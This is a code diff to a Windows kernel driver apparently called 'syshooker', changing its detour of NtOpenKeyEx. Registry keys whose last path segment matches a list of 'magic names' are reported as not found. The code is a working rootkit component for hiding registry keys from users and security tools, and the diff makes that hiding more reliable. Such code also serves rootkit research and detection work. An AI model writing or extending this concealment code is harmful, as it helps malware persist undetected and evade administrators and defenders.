@@ -32,7 +32,13 @@ NTSTATUS DetourNtOpenKeyEx(
 			memset(ObjectName, 0, ObjectAttributes->ObjectName->Length + sizeof(wchar_t));
 			memcpy(ObjectName, ObjectAttributes->ObjectName->Buffer, ObjectAttributes->ObjectName->Length);
 
-			if (matchMagicNames(ObjectName, (Target)TARGET_REGISTRY)) {
+			// find the last L'\\' in the ObjectName to extract the key from the full registry path
+			wchar_t* LastBackslash = wcsrchr(ObjectName, L'\\');
+ 
+			// if L'\\' was not found, pass the whole ObjectName to the matching function
+			// otherwise pass the remaining string AFTER the last backslash
+			// in other words - the extracted registry key
+			if (matchMagicNames(LastBackslash == nullptr ? ObjectName : LastBackslash + 1, (Target)TARGET_REGISTRY)) {
 				kprintf("[+] syshooker: NtOpenKeyEx: hiding %ws\n", ObjectName);
 				ExFreePool(ObjectName);
 				return STATUS_OBJECT_NAME_NOT_FOUND;
